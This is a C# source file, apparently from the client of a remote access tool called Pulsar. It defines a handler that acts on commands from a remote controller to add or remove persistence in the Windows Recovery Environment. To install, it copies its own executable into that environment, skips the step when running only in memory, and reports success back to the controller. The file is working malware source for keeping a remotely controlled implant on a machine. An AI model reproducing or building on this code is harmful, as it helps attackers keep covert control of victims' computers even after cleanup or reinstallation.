using Pulsar.Client.Helper.WinRE;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.ClientManagement.WinRE;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;
using System.Reflection;

namespace Pulsar.Client.Messages
{
    public class WinREPersistenceHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoAddWinREPersistence || message is DoRemoveWinREPersistence;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoAddWinREPersistence msg:
                    Execute(sender, msg);
                    break;
                case DoRemoveWinREPersistence msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoAddWinREPersistence message)
        {
            // check to see if the file is currently being ran in memory or on disk.
            // if its in memory then just return
            string exeLocation;

            try
            {
                exeLocation = Assembly.GetExecutingAssembly().Location;

                if (string.IsNullOrEmpty(exeLocation))
                {
                    // we running in memory
                    return;
                }
            } catch (Exception ex)
            {
                // ye we def in memory
                Debug.WriteLine($"Failed to get assembly location: {ex.Message}");
                return;
            }

            byte[] bytes = System.IO.File.ReadAllBytes(exeLocation);
            WinREPersistence.Uninstall();
            WinREPersistence.InstallFile(bytes, ".exe");

            client.Send(new SetStatus
            {
                Message = "Added WinRE Persistence"
            });
        }

        private void Execute(ISender client, DoRemoveWinREPersistence message)
        {
            WinREPersistence.Uninstall();
            client.Send(new SetStatus
            {
                Message = "Removed WinRE Persistence"
            });
        }
    }
}
